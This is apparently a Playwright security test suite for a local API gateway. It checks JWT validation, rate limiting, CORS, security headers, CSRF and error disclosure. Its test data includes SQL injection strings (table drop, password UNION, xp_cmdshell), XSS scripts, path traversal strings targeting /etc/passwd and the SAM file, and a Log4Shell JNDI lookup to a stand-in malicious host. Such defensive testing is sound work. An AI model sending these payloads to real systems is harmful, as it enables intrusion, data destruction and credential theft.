/**
 * Gateway Service Security Tests
 * Testing: Authentication, authorization, input validation,
 * rate limiting, CORS, security headers, JWT handling
 */

import { test, expect, Page } from '@playwright/test';
import { chromium } from '@playwright/test';
import crypto from 'crypto';

const GATEWAY_BASE_URL = 'http://localhost:4000';

interface SecurityTestContext {
  page: Page;
  validToken: string;
  expiredToken: string;
  invalidToken: string;
  maliciousPayloads: string[];
}

class SecurityTestRunner {
  constructor(private context: SecurityTestContext) {}

  async testSQLInjection(endpoint: string, params: Record<string, string> = {}): Promise<boolean> {
    const sqlPayloads = [
      "'; DROP TABLE users; --",
      "' OR '1'='1",
      "'; SELECT * FROM users WHERE 'a'='a",
      "' UNION SELECT null, username, password FROM users --",
      "'; EXEC xp_cmdshell('dir'); --"
    ];

    let vulnerabilityDetected = false;

    for (const payload of sqlPayloads) {
      for (const [key, _] of Object.entries(params)) {
        const testParams = { ...params, [key]: payload };
        const queryString = new URLSearchParams(testParams).toString();
        const testUrl = `${GATEWAY_BASE_URL}${endpoint}?${queryString}`;

        try {
          const response = await this.context.page.request.get(testUrl);
          const responseText = await response.text();

          // Check for SQL error messages that might indicate vulnerability
          const errorPatterns = [
            /sql syntax/i,
            /mysql_fetch/i,
            /ORA-\d+/i,
            /Microsoft.*ODBC.*SQL/i,
            /PostgreSQL.*ERROR/i,
            /Warning.*mysql_/i,
            /valid MySQL result/i,
            /MySqlClient\./i
          ];

          if (errorPatterns.some(pattern => pattern.test(responseText))) {
            console.error(`🚨 Potential SQL injection vulnerability detected at ${endpoint} with payload: ${payload}`);
            vulnerabilityDetected = true;
          }

          // Response should not contain database errors
          expect(responseText).not.toMatch(/sql syntax|mysql_fetch|ORA-\d+|Microsoft.*ODBC.*SQL|PostgreSQL.*ERROR/i);
        } catch (error) {
          // Network errors are acceptable for security tests
          console.log(`Request failed for SQL injection test: ${error}`);
        }
      }
    }

    return vulnerabilityDetected;
  }

  async testXSS(endpoint: string): Promise<boolean> {
    const xssPayloads = [
      '<script>alert("XSS")</script>',
      '<img src="x" onerror="alert(\'XSS\')">',
      'javascript:alert("XSS")',
      '<svg onload="alert(\'XSS\')">',
      '"><script>alert("XSS")</script>',
      "'><script>alert('XSS')</script>",
      '<iframe src="javascript:alert(\'XSS\')"></iframe>'
    ];

    let vulnerabilityDetected = false;

    for (const payload of xssPayloads) {
      try {
        const response = await this.context.page.request.post(`${GATEWAY_BASE_URL}${endpoint}`, {
          data: { input: payload },
          headers: { 'Content-Type': 'application/json' }
        });

        const responseText = await response.text();

        // Check if payload is reflected without proper encoding
        if (responseText.includes(payload) && !responseText.includes('&lt;script&gt;')) {
          console.error(`🚨 Potential XSS vulnerability detected at ${endpoint} with payload: ${payload}`);
          vulnerabilityDetected = true;
        }

        // Response should not contain unescaped script tags
        expect(responseText).not.toContain('<script>');
        expect(responseText).not.toContain('javascript:');
      } catch (error) {
        console.log(`Request failed for XSS test: ${error}`);
      }
    }

    return vulnerabilityDetected;
  }

  async testCSRF(endpoint: string): Promise<void> {
    // Test CSRF protection by attempting requests without proper tokens
    try {
      const response = await this.context.page.request.post(`${GATEWAY_BASE_URL}${endpoint}`, {
        data: { action: 'delete', id: '123' },
        headers: {
          'Content-Type': 'application/json',
          'Origin': 'https://malicious-site.com'
        }
      });

      // Should reject requests from different origins without proper CSRF tokens
      expect(response.status()).toBeGreaterThanOrEqual(400);
    } catch (error) {
      // Network errors are acceptable
      console.log(`CSRF test request failed: ${error}`);
    }
  }

  async testRateLimiting(endpoint: string, maxRequests: number = 10): Promise<void> {
    console.log(`Testing rate limiting for ${endpoint} with ${maxRequests} requests`);

    const requests: Promise<any>[] = [];
    
    // Send requests rapidly to test rate limiting
    for (let i = 0; i < maxRequests + 5; i++) {
      requests.push(
        this.context.page.request.get(`${GATEWAY_BASE_URL}${endpoint}`)
          .catch(error => ({ error: error.message }))
      );
    }

    const responses = await Promise.all(requests);
    const rateLimitedResponses = responses.filter(response => 
      response.status && (response.status() === 429 || response.status() === 503)
    );

    // Should have at least some rate-limited responses
    expect(rateLimitedResponses.length).toBeGreaterThan(0);
    console.log(`Rate limiting working: ${rateLimitedResponses.length} requests blocked`);
  }

  async testJWTSecurity(): Promise<void> {
    const jwtTests = [
      {
        name: 'Valid JWT',
        token: this.context.validToken,
        expectedStatus: 200
      },
      {
        name: 'Expired JWT',
        token: this.context.expiredToken,
        expectedStatus: 401
      },
      {
        name: 'Invalid JWT',
        token: this.context.invalidToken,
        expectedStatus: 401
      },
      {
        name: 'Malformed JWT',
        token: 'malformed.jwt.token',
        expectedStatus: 401
      },
      {
        name: 'No JWT',
        token: '',
        expectedStatus: 401
      }
    ];

    for (const testCase of jwtTests) {
      const headers: Record<string, string> = {};
      if (testCase.token) {
        headers['Authorization'] = `Bearer ${testCase.token}`;
      }

      try {
        const response = await this.context.page.request.get(`${GATEWAY_BASE_URL}/api/v1/codai`, {
          headers
        });

        expect(response.status()).toBe(testCase.expectedStatus);
        console.log(`✅ JWT test "${testCase.name}": Expected ${testCase.expectedStatus}, got ${response.status()}`);
      } catch (error) {
        console.log(`JWT test "${testCase.name}" failed: ${error}`);
      }
    }
  }
}

// JWT Helper functions
function generateValidJWT(): string {
  const header = Buffer.from(JSON.stringify({ alg: 'HS256', typ: 'JWT' })).toString('base64url');
  const payload = Buffer.from(JSON.stringify({
    sub: 'test-user',
    iat: Math.floor(Date.now() / 1000),
    exp: Math.floor(Date.now() / 1000) + 3600 // Expires in 1 hour
  })).toString('base64url');
  
  const secret = 'test-secret-key';
  const signature = crypto
    .createHmac('sha256', secret)
    .update(`${header}.${payload}`)
    .digest('base64url');
  
  return `${header}.${payload}.${signature}`;
}

function generateExpiredJWT(): string {
  const header = Buffer.from(JSON.stringify({ alg: 'HS256', typ: 'JWT' })).toString('base64url');
  const payload = Buffer.from(JSON.stringify({
    sub: 'test-user',
    iat: Math.floor(Date.now() / 1000) - 7200, // Issued 2 hours ago
    exp: Math.floor(Date.now() / 1000) - 3600  // Expired 1 hour ago
  })).toString('base64url');
  
  const secret = 'test-secret-key';
  const signature = crypto
    .createHmac('sha256', secret)
    .update(`${header}.${payload}`)
    .digest('base64url');
  
  return `${header}.${payload}.${signature}`;
}

test.describe('Gateway Service - Security Tests', () => {
  let securityContext: SecurityTestContext;

  test.beforeAll(async () => {
    const browser = await chromium.launch({ headless: true });
    const page = await browser.newPage();

    securityContext = {
      page,
      validToken: generateValidJWT(),
      expiredToken: generateExpiredJWT(),
      invalidToken: 'invalid.jwt.token.signature',
      maliciousPayloads: [
        '<script>alert("XSS")</script>',
        '"; DROP TABLE users; --',
        '../../../etc/passwd',
        '${jndi:ldap://malicious.com/exploit}'
      ]
    };
  });

  test.afterAll(async () => {
    await securityContext.page.context().browser()?.close();
  });

  test.describe('Authentication & Authorization', () => {
    test('should enforce JWT authentication on protected endpoints', async () => {
      const runner = new SecurityTestRunner(securityContext);
      await runner.testJWTSecurity();
    });

    test('should reject requests with missing authentication', async () => {
      const protectedEndpoints = [
        '/api/v1/codai',
        '/api/v1/memorai',
        '/api/v1/bancai',
        '/api/v1/admin'
      ];

      for (const endpoint of protectedEndpoints) {
        const response = await securityContext.page.request.get(`${GATEWAY_BASE_URL}${endpoint}`);
        
        // Should return 401 Unauthorized or redirect to login
        expect([401, 403, 302]).toContain(response.status());
        console.log(`✅ Protected endpoint ${endpoint}: ${response.status()}`);
      }
    });

    test('should validate JWT token signatures', async () => {
      const tamperedToken = securityContext.validToken.slice(0, -10) + 'tamperered';
      
      const response = await securityContext.page.request.get(`${GATEWAY_BASE_URL}/api/v1/codai`, {
        headers: {
          'Authorization': `Bearer ${tamperedToken}`
        }
      });

      expect(response.status()).toBe(401);
    });

    test('should enforce role-based access control', async () => {
      // Test with a user token that has limited permissions
      const limitedUserToken = generateValidJWT(); // In real scenario, this would have limited roles
      
      const adminEndpoints = [
        '/api/v1/admin/users',
        '/api/v1/admin/settings',
        '/api/gateway/admin'
      ];

      for (const endpoint of adminEndpoints) {
        try {
          const response = await securityContext.page.request.get(`${GATEWAY_BASE_URL}${endpoint}`, {
            headers: {
              'Authorization': `Bearer ${limitedUserToken}`
            }
          });

          // Should return 403 Forbidden for insufficient permissions
          expect([403, 404]).toContain(response.status());
        } catch (error) {
          // Endpoint might not exist, which is also acceptable
          console.log(`Admin endpoint test failed: ${error}`);
        }
      }
    });
  });

  test.describe('Input Validation & Injection Prevention', () => {
    test('should prevent SQL injection attempts', async () => {
      const runner = new SecurityTestRunner(securityContext);
      
      const testEndpoints = [
        { endpoint: '/api/gateway/services', params: { search: 'test' } },
        { endpoint: '/api/v1/id', params: { userId: '123' } },
        { endpoint: '/health', params: { format: 'json' } }
      ];

      for (const testCase of testEndpoints) {
        const vulnerabilityDetected = await runner.testSQLInjection(testCase.endpoint, testCase.params);
        expect(vulnerabilityDetected).toBeFalsy();
      }
    });

    test('should prevent XSS attacks', async () => {
      const runner = new SecurityTestRunner(securityContext);
      
      const testEndpoints = [
        '/api/gateway/feedback',
        '/api/v1/search',
        '/api/gateway/contact'
      ];

      for (const endpoint of testEndpoints) {
        try {
          const vulnerabilityDetected = await runner.testXSS(endpoint);
          expect(vulnerabilityDetected).toBeFalsy();
        } catch (error) {
          // Endpoint might not exist or not accept POST
          console.log(`XSS test skipped for ${endpoint}: ${error}`);
        }
      }
    });

    test('should sanitize file path inputs to prevent directory traversal', async () => {
      const pathTraversalPayloads = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '....//....//....//etc//passwd'
      ];

      for (const payload of pathTraversalPayloads) {
        try {
          const response = await securityContext.page.request.get(`${GATEWAY_BASE_URL}/api/files`, {
            headers: {
              'Accept': 'text/plain'
            }
          });

          const responseText = await response.text();
          
          // Should not return system files
          expect(responseText).not.toContain('root:');
          expect(responseText).not.toContain('Administrator');
          expect(responseText).not.toContain('etc/passwd');
        } catch (error) {
          // Endpoint might not exist
          console.log(`Directory traversal test failed: ${error}`);
        }
      }
    });

    test('should validate and limit request size', async () => {
      const largePayload = 'x'.repeat(10 * 1024 * 1024); // 10MB payload
      
      try {
        const response = await securityContext.page.request.post(`${GATEWAY_BASE_URL}/api/v1/upload`, {
          data: largePayload,
          timeout: 30000
        });

        // Should reject oversized payloads
        expect([413, 400, 500]).toContain(response.status());
      } catch (error) {
        // Timeout or network error is acceptable for oversized payloads
        expect(error.message).toContain('timeout');
      }
    });
  });

  test.describe('Rate Limiting & DDoS Protection', () => {
    test('should enforce rate limiting on API endpoints', async () => {
      const runner = new SecurityTestRunner(securityContext);
      
      await runner.testRateLimiting('/api/v1/codai', 20);
      await runner.testRateLimiting('/api/gateway/services', 50);
      await runner.testRateLimiting('/health', 100);
    });

    test('should handle burst requests appropriately', async () => {
      const burstSize = 50;
      const requests: Promise<any>[] = [];

      // Send burst of requests
      for (let i = 0; i < burstSize; i++) {
        requests.push(
          securityContext.page.request.get(`${GATEWAY_BASE_URL}/api/v1/memorai`)
            .catch(error => ({ error: error.message }))
        );
      }

      const responses = await Promise.all(requests);
      const successfulResponses = responses.filter(r => r.status && r.status() < 400);
      const throttledResponses = responses.filter(r => r.status && r.status() === 429);

      // Should throttle some requests during burst
      expect(throttledResponses.length).toBeGreaterThan(0);
      expect(successfulResponses.length).toBeLessThan(burstSize);
      
      console.log(`Burst test: ${successfulResponses.length} successful, ${throttledResponses.length} throttled`);
    });

    test('should implement IP-based rate limiting', async () => {
      // Simulate requests from same IP
      const sameIPRequests = 30;
      const requests: Promise<any>[] = [];

      for (let i = 0; i < sameIPRequests; i++) {
        requests.push(
          securityContext.page.request.get(`${GATEWAY_BASE_URL}/health`)
            .catch(error => ({ error }))
        );
      }

      const responses = await Promise.all(requests);
      const rateLimitedCount = responses.filter(r => 
        r.status && r.status() === 429
      ).length;

      // Should rate limit after certain number of requests
      expect(rateLimitedCount).toBeGreaterThan(0);
    });
  });

  test.describe('CORS & Security Headers', () => {
    test('should implement proper CORS policies', async () => {
      const corsTestCases = [
        {
          origin: 'https://trusted-domain.com',
          expectedAccess: true
        },
        {
          origin: 'https://malicious-site.com',
          expectedAccess: false
        },
        {
          origin: 'http://localhost:3000',
          expectedAccess: true // Dev environment
        }
      ];

      for (const testCase of corsTestCases) {
        const response = await securityContext.page.request.get(`${GATEWAY_BASE_URL}/api/v1/codai`, {
          headers: {
            'Origin': testCase.origin,
            'Authorization': `Bearer ${securityContext.validToken}`
          }
        });

        const corsHeader = response.headers()['access-control-allow-origin'];
        
        if (testCase.expectedAccess) {
          // Should allow access from trusted domains
          expect(corsHeader).toBeDefined();
        } else {
          // Should not allow access from untrusted domains
          if (corsHeader) {
            expect(corsHeader).not.toBe('*');
            expect(corsHeader).not.toBe(testCase.origin);
          }
        }
      }
    });

    test('should include essential security headers', async () => {
      const response = await securityContext.page.request.get(`${GATEWAY_BASE_URL}/health`);
      const headers = response.headers();

      // Check for security headers
      const securityHeaders = {
        'x-frame-options': ['DENY', 'SAMEORIGIN'],
        'x-content-type-options': ['nosniff'],
        'x-xss-protection': ['1; mode=block', '0'],
        'strict-transport-security': null, // Should exist for HTTPS
        'content-security-policy': null,   // Should have CSP
        'referrer-policy': ['strict-origin-when-cross-origin', 'no-referrer', 'same-origin']
      };

      for (const [headerName, expectedValues] of Object.entries(securityHeaders)) {
        const headerValue = headers[headerName];
        
        if (expectedValues === null) {
          // Header should exist but value can vary
          if (headerName === 'strict-transport-security' && !headers['strict-transport-security']) {
            console.warn(`⚠️ Missing security header: ${headerName}`);
          }
        } else if (expectedValues && !expectedValues.includes(headerValue)) {
          console.warn(`⚠️ Security header ${headerName} has unexpected value: ${headerValue}`);
        }
      }

      // At minimum, should have X-Frame-Options
      expect(headers['x-frame-options'] || headers['X-Frame-Options']).toBeDefined();
    });

    test('should prevent clickjacking attacks', async () => {
      const response = await securityContext.page.request.get(`${GATEWAY_BASE_URL}/health`);
      const frameOptions = response.headers()['x-frame-options'] || response.headers()['X-Frame-Options'];
      
      // Should prevent framing
      expect(['DENY', 'SAMEORIGIN']).toContain(frameOptions);
    });

    test('should prevent MIME type sniffing', async () => {
      const response = await securityContext.page.request.get(`${GATEWAY_BASE_URL}/health`);
      const contentTypeOptions = response.headers()['x-content-type-options'] || response.headers()['X-Content-Type-Options'];
      
      expect(contentTypeOptions).toBe('nosniff');
    });
  });

  test.describe('CSRF Protection', () => {
    test('should prevent cross-site request forgery', async () => {
      const runner = new SecurityTestRunner(securityContext);
      
      const csrfTestEndpoints = [
        '/api/v1/admin/settings',
        '/api/v1/user/profile',
        '/api/gateway/config'
      ];

      for (const endpoint of csrfTestEndpoints) {
        try {
          await runner.testCSRF(endpoint);
        } catch (error) {
          console.log(`CSRF test failed for ${endpoint}: ${error}`);
        }
      }
    });

    test('should validate referrer headers for state-changing operations', async () => {
      const maliciousReferrers = [
        'https://malicious-site.com',
        'http://evil.com',
        'https://phishing-attempt.net'
      ];

      for (const referrer of maliciousReferrers) {
        try {
          const response = await securityContext.page.request.post(`${GATEWAY_BASE_URL}/api/v1/admin/users`, {
            data: { action: 'create', username: 'testuser' },
            headers: {
              'Referer': referrer,
              'Authorization': `Bearer ${securityContext.validToken}`
            }
          });

          // Should reject requests from malicious referrers
          expect(response.status()).toBeGreaterThanOrEqual(400);
        } catch (error) {
          console.log(`Referrer validation test error: ${error}`);
        }
      }
    });
  });

  test.describe('Information Disclosure Prevention', () => {
    test('should not expose sensitive information in error messages', async () => {
      const errorTriggeringRequests = [
        '/api/v1/nonexistent-service',
        '/api/v1/codai/invalid-endpoint',
        '/api/gateway/admin/secrets'
      ];

      for (const endpoint of errorTriggeringRequests) {
        try {
          const response = await securityContext.page.request.get(`${GATEWAY_BASE_URL}${endpoint}`);
          const responseText = await response.text();
          
          // Error messages should not contain sensitive information
          const sensitivePatterns = [
            /password/i,
            /secret/i,
            /key/i,
            /token/i,
            /database.*error/i,
            /stack trace/i,
            /file not found.*\/.*\//i // Full file paths
          ];

          sensitivePatterns.forEach(pattern => {
            expect(responseText).not.toMatch(pattern);
          });
        } catch (error) {
          console.log(`Error disclosure test failed: ${error}`);
        }
      }
    });

    test('should not expose server version information', async () => {
      const response = await securityContext.page.request.get(`${GATEWAY_BASE_URL}/health`);
      const headers = response.headers();
      
      // Should not expose server software versions
      expect(headers['server']).not.toMatch(/apache\/\d+\.\d+/i);
      expect(headers['server']).not.toMatch(/nginx\/\d+\.\d+/i);
      expect(headers['x-powered-by']).toBeUndefined();
    });

    test('should not expose internal API structure', async () => {
      // Test for endpoints that might leak internal structure
      const probeEndpoints = [
        '/api/swagger',
        '/api/docs',
        '/api/openapi.json',
        '/.env',
        '/package.json',
        '/api/v1/debug',
        '/api/internal'
      ];

      for (const endpoint of probeEndpoints) {
        const response = await securityContext.page.request.get(`${GATEWAY_BASE_URL}${endpoint}`);
        
        // Should not expose internal documentation or configuration
        if (response.status() === 200) {
          const responseText = await response.text();
          
          // Check if response contains sensitive internal information
          expect(responseText).not.toContain('DATABASE_URL');
          expect(responseText).not.toContain('API_SECRET');
          expect(responseText).not.toContain('private_key');
        }
      }
    });
  });

  test.describe('Session Management', () => {
    test('should handle session timeout appropriately', async () => {
      // This would test session expiration in a real application
      // For now, we test JWT expiration handling
      
      const response = await securityContext.page.request.get(`${GATEWAY_BASE_URL}/api/v1/codai`, {
        headers: {
          'Authorization': `Bearer ${securityContext.expiredToken}`
        }
      });

      expect(response.status()).toBe(401);
    });

    test('should prevent session fixation attacks', async () => {
      // Test that sessions are regenerated after authentication
      // This is more relevant for cookie-based sessions
      
      const preAuthResponse = await securityContext.page.request.get(`${GATEWAY_BASE_URL}/health`);
      const preAuthCookies = preAuthResponse.headers()['set-cookie'];
      
      // After authentication, session should be different
      const postAuthResponse = await securityContext.page.request.get(`${GATEWAY_BASE_URL}/api/v1/codai`, {
        headers: {
          'Authorization': `Bearer ${securityContext.validToken}`
        }
      });
      
      const postAuthCookies = postAuthResponse.headers()['set-cookie'];
      
      // Sessions should be different (if using cookies)
      if (preAuthCookies && postAuthCookies) {
        expect(preAuthCookies).not.toBe(postAuthCookies);
      }
    });
  });

  test.describe('Security Monitoring & Logging', () => {
    test('should log security events appropriately', async () => {
      // Trigger security events that should be logged
      const securityEvents = [
        // Invalid JWT attempt
        {
          request: () => securityContext.page.request.get(`${GATEWAY_BASE_URL}/api/v1/codai`, {
            headers: { 'Authorization': 'Bearer invalid-token' }
          }),
          eventType: 'invalid_jwt'
        },
        // Rate limit trigger
        {
          request: async () => {
            const requests = Array.from({ length: 20 }, () =>
              securityContext.page.request.get(`${GATEWAY_BASE_URL}/health`)
            );
            await Promise.all(requests);
          },
          eventType: 'rate_limit_triggered'
        }
      ];

      for (const event of securityEvents) {
        try {
          await event.request();
          // In a real test, you would check logs for the security event
          console.log(`Security event triggered: ${event.eventType}`);
        } catch (error) {
          console.log(`Security event test failed: ${error}`);
        }
      }
    });

    test('should detect and respond to suspicious patterns', async () => {
      // Simulate suspicious behavior patterns
      const suspiciousPatterns = [
        // Multiple failed authentication attempts
        async () => {
          for (let i = 0; i < 5; i++) {
            await securityContext.page.request.get(`${GATEWAY_BASE_URL}/api/v1/codai`, {
              headers: { 'Authorization': 'Bearer fake-token-' + i }
            });
          }
        },
        // Rapid endpoint enumeration
        async () => {
          const endpoints = ['/api/admin', '/api/users', '/api/config', '/api/debug', '/api/internal'];
          await Promise.all(endpoints.map(ep => 
            securityContext.page.request.get(`${GATEWAY_BASE_URL}${ep}`)
              .catch(() => {}) // Ignore errors
          ));
        }
      ];

      for (const pattern of suspiciousPatterns) {
        try {
          await pattern();
          console.log('Suspicious pattern simulation completed');
        } catch (error) {
          console.log(`Suspicious pattern test error: ${error}`);
        }
      }
    });
  });
});
